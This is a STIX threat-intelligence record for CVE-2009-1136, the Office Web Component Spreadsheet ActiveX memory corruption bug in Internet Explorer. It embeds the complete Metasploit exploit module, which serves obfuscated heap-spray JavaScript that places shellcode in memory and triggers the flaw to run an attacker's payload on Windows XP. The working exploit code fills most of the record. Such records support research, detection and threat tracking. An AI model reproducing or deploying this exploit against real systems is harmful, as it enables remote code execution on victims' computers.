{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--017a90c8-3cdd-4d6f-bcc8-b9d714ff8f4a",
    "created": "2024-08-14T16:40:31.935422Z",
    "modified": "2024-08-14T16:40:31.935426Z",
    "name": "Microsoft OWC Spreadsheet msDataSourceObject Memory Corruption",
    "description": " This module exploits a memory corruption vulnerability within versions 10 and 11 of the Office Web Component Spreadsheet ActiveX control. This module was based on an exploit found in the wild.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/ms09_043_owc_msdso.rb",
            "external_id": "ms09_043_owc_msdso.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2009-1136"
        },
        {
            "source_name": "reference",
            "url": "http://ahmed.obied.net/software/code/exploits/ie_owc.py"
        },
        {
            "source_name": "reference",
            "url": "https://web.archive.org/web/20090716143635/http://xeye.us/blog/2009/07/one-0day/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Microsoft OWC Spreadsheet msDataSourceObject Memory Corruption',\n      'Description'    => %q{\n        This module exploits a memory corruption vulnerability within versions 10 and 11 of\n        the Office Web Component Spreadsheet ActiveX control. This module was based on\n        an exploit found in the wild.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         => [ 'unknown', 'hdm', 'Ahmed Obied', 'DSR! <xchwarze[at]gmail.com>' ],\n      'References'     =>\n        [\n          [ 'CVE', '2009-1136' ],\n          [ 'OSVDB', '55806' ],\n          [ 'MSB', 'MS09-043' ],\n          [ 'URL', 'http://ahmed.obied.net/software/code/exploits/ie_owc.py' ],\n          [ 'EDB', '9163' ],\n          [ 'URL', 'https://web.archive.org/web/20090716143635/http://xeye.us/blog/2009/07/one-0day/' ]\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Payload'        =>\n        {\n          'Space'           => 1024,\n          'BadChars'        => '',\n          'StackAdjustment' => -3500,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Windows XP SP0-SP3 / IE 6.0 SP0-2 & IE 7.0', { 'Ret' => 0x0C0C0C0C } ] # other exploits use 0x0b0c0b0c\n        ],\n      'DisclosureDate' => '2009-07-13',\n      'DefaultTarget'  => 0))\n\n      @javascript_encode_key = rand_text_alpha(rand(10) + 10)\n  end\n\n  def on_request_uri(cli, request)\n\n    # Send a redirect with the javascript encoding key\n    #if (!request.uri.match(/\\?\\w+/))\n    #\tsend_local_redirect(cli, \"?#{@javascript_encode_key}\")\n    #\treturn\n    #end\n\n    return if ((p = regenerate_payload(cli)) == nil)\n\n    print_status(\"Sending #{self.name}\")\n\n\n    shellcode = Rex::Text.to_unescape(p.encoded)\n    retaddr   = Rex::Text.to_unescape([target.ret].pack('V'))\n\n    js = %Q|\nvar xshellcode = unescape(\"#{shellcode}\");\n\nvar xarray = new Array();\nvar xls = 0x81000-(xshellcode.length*2);\nvar xbigblock = unescape(\"#{retaddr}\");\n\nwhile( xbigblock.length < xls / 2) { xbigblock += xbigblock; }\nvar xlh = xbigblock.substring(0, xls / 2);\ndelete xbigblock;\n\nfor(xi=0; xi<0x99*2; xi++) {\n  xarray[xi] = xlh + xlh + xshellcode;\n}\n\nCollectGarbage();\n\nvar xobj;\ntry {\n  xobj = new ActiveXObject(\"OWC10.Spreadsheet\");\n} catch(err) {\n  try {\n    xobj = new ActiveXObject(\"OWC11.Spreadsheet\");\n  } catch(err) {\n  }\n}\n\nxe = new Array();\nxe.push(1);\nxe.push(2);\nxe.push(0);\nxe.push(window);\n\nfor(xi=0; xi < xe.length; xi++){\n  for(xj=0; xj<10; xj++){\n    try { xobj.Evaluate(xe[xi]); } catch(e) { }\n  }\n}\n\nwindow.status = xe[3] + '';\n\nfor(xj=0; xj<10; xj++){\n  try{ xobj.msDataSourceObject(xe[3]); } catch(e) { }\n}\n|\n\n    # Obfuscate it up a bit\n    js = obfuscate_js(js,\n      'Symbols' =>  {\n        'Variables' => %W{ xshellcode xarray xls xbigblock xlh xi xobj xe xj err}\n      }\n    ).to_s\n\n\n    # Encode the javascript payload with the URI key\n    # js = encrypt_js(js, @javascript_encode_key)\n\n    # Fire off the page to the client\n    send_response(cli, \"<html><script language='javascript'>#{js}</script></html>\")\n\n    # Handle the payload\n    handler(cli)\n  end\nend\n",
    "x_mitre_disclosure_date": "2009-07-13",
    "x_mitre_platforms": [
        "win'"
    ]
}